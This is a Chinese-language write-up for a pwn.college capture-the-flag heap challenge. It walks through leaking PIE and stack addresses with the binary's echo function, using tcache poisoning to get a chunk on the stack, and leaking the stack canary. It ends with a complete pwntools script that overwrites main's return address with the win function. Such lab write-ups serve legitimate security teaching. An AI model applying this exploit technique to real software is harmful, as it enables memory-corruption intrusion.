在linux x86-64中

参数：RDI RSI RDX RCX R8 R9 → STACK
返回值：RAX

printf函数接收三个参数，可以推出[rbp-0x124]存的是allocations数组的index。而[rbp-0x11c]则存的是malloc的size。 函数调用malloc后，返回地址被存在[rbp+rax*8-0x110]，此时的rax是rbp-0x124也即allocations数组的index。正好构成了 base + index * 8, 8 代表 allocations数组每个元素占8字节。 那么[rbp-0x110]存了元素allocations[0]，即malloc的返回地址。

echo函数malloc了一个0x20大小的内存块用于存放参数。malloc返回的地址存放在rbp-0x18，我们设这个返回地址为p。首先把"/bin/echo"字符串的地址存在malloc出来的内存块的起始位值，即p+0， 然后把[rbp-0xe]起始的五个字符“Data:"在栈上的地址存入p+8，p+16存的是传进来的两个参数。分别是allocations数组存的某一项和offset参数。

echo malloc出来的内存块布局如下

我们看到，这个内存块上有两个我们感兴趣的地址，一个是字符串 “/bin/echo"这个静态常量的在内存上的存储地址， 还有一个是"Data:"在栈上的地址，求出这两个我们能分别泄漏出pie_base和栈地址。

怎么利用echo泄漏出这两个地址呢？

我们知道，调用一次echo会向内存申请一个内存块。如何通过 allocation[i] + offset 的形式访问到这个内存块呢？ 如果我们先调用程序的malloc申请一块内存比如malloc(24)，此时操作系统分配的chunk大小为0x201,再调用一次echo，那么echo申请的内存块正好紧挨着malloc(24)申请的内存块。

+----------------+-------------------------+
|                |"/bin/echo"|"Data:"|...  |
+----------------+-------------------------+
↑                ↑
allocations[0]   allocations[0]+0x20

整个攻击链是这样的：

A = malloc(0, 24)

echo(0,0)

pie_leak = echo(0, 0x20) # 泄漏"/bin/echo"地址
stack_leak = echo(0, 0x28) # 泄漏“Data:"地址

pie_base = pie_leak - elf.symbols["bin_echo"]
stack_base = stack_leak + 0x5e

B = malloc(1, 24)

free(1)
free(0)

tcache:
chunk A -> chunk B

scanf(0, p64(stack_base)) # 将chunk A 的 next 改为 stack_base

malloc(2, 24) # 得到A
malloc(3, 24) # 得到stack上伪造的chunk

泄漏canary
写入payload覆盖main的返回地址为win函数的返回地址

如何泄漏canary？

我们同样可以利用echo来泄漏canary，因为此时allocations[3]存储的是stack_base的地址，stack_base 距离canary为0x108

至此我们就可以写解题脚本了。

解题脚本

from pwn import *
context.log_level = 'debug'
BIN = "/challenge/echo-emanations-easy"
PROMPTS = "[*] Function (malloc/free/echo/scanf/quit): "
elf = ELF(BIN, checksec=False)
p = process(BIN)

def solve():
    def choose(command):
        p.sendlineafter(PROMPTS, command)
    
    def malloc(index, size):
        choose(b"malloc")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendlineafter(b"Size: ", str(size).encode())
    
    def scanf(index, data):
        choose(b"scanf")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendline(data)
    
    def echo(index, offset, leak=False):
        choose(b"echo")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendlineafter(b"Offset: ", str(offset).encode())
        if leak:
            p.recvuntil(b"Data: ")
            return p.recv(6).ljust(8,b"\x00")
        
    def free(index):
        choose(b"free")
        p.sendlineafter(b"Index: ", str(index).encode())
    
    malloc(0, 24)

    echo(0,0)

    pie_leak = u64(echo(0, 0x20, True))
    stack_leak = u64(echo(0, 0x28, True))
    pie_base = pie_leak - elf.symbols["bin_echo"]

    win_addr = pie_base + elf.symbols["win"]

    stack_base = stack_leak + 0x5e

    malloc(1, 24)
    free(1)
    free(0)

    scanf(0, p64(stack_base))

    malloc(2, 24)
    malloc(3, 24)

    choose(b"echo")
    p.sendlineafter(b"Index: ", b"3")
    p.sendlineafter(b"Offset: ", b"265") # 0x109

    p.recvuntil(b"Data: ")
    canary_tail = p.recvline().strip()
    log.success(f"canary_tail:{canary_tail}")

    canary = b"\x00" + canary_tail
    log.success(f"canary:{canary}")

    payload = b"A" * 0x108 + canary + p64(0) + p64(win_addr)

    scanf(3, payload)

    choose(b"quit")

    return p.recvall(timeout=2)



output = solve() 
p.interactive()

if output and b"pwn.college{" in output:
    print(output.decode("latin1", errors="replace"))
